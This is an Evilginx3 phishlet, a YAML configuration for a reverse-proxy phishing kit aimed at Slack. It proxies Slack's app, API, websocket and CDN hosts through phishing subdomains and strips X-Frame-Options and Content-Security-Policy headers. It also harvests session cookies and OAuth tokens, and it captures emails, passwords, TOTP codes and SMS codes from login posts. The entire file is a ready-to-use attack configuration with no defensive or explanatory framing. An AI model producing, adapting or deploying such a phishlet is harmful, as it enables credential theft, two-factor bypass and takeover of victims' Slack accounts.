min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://app.slack.com/'

proxy_hosts:
  - {phish_sub: 'app', orig_sub: 'app', domain: 'slack.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'slack.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'slack.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'files', orig_sub: 'files', domain: 'slack.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'wss-primary', orig_sub: 'wss-primary', domain: 'slack.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'wss-backup', orig_sub: 'wss-backup', domain: 'slack.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'slack-edge.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Slack domain URLs
  - {triggers_on: 'app.slack.com', orig_sub: 'app', domain: 'slack.com', search: 'https://app\\.slack\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'app.slack.com', orig_sub: 'api', domain: 'slack.com', search: 'https://api\\.slack\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'app.slack.com', orig_sub: 'hooks', domain: 'slack.com', search: 'https://hooks\\.slack\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'app.slack.com', orig_sub: 'files', domain: 'slack.com', search: 'https://files\\.slack\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'app.slack.com', orig_sub: 'wss-primary', domain: 'slack.com', search: 'wss://[a-z0-9-]+\\.slack\\.com', replace: 'wss://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  - {triggers_on: 'app.slack.com', orig_sub: 'wss-backup', domain: 'slack.com', search: 'wss://[a-z0-9-]+\\.slack-msgs\\.com', replace: 'wss://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Replace Slack CDN URLs
  - {triggers_on: 'app.slack.com', orig_sub: 'cdn', domain: 'slack-edge.com', search: 'https://[a-z0-9-]+\\.slack-edge\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Remove security headers
  - {triggers_on: 'app.slack.com', orig_sub: 'app', domain: 'slack.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'app.slack.com', orig_sub: 'app', domain: 'slack.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'app.slack.com', orig_sub: 'api', domain: 'slack.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'app.slack.com', orig_sub: 'api', domain: 'slack.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Slack authentication cookies
  - domain: '.slack.com'
    keys: ['d', 'x-slack-user', 'x-slack-team', 'x-slack-workspace-id', '__stripe_mid']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.slack.com'
    keys: ['b', 'x', 'slack_ts', 'slack_ssid', 'slack_ssid_ss']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.slack.com'
    keys: ['oauth_token', 'oauth_token_secret', 'slack_access_token']
    type: 'cookie'
    optional: true
  
  # Workspace-specific cookies
  - domain: '.slack.com'
    keys: ['workspace_id', 'team_id', 'user_id']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'signin'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totp_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/client'
  - '^/messages'
  - '^/archives'
  - '^/files'
  - '^/workspace-settings'
  - '^/account/settings'

login:
  domain: 'app.slack.com'
  path: '/'

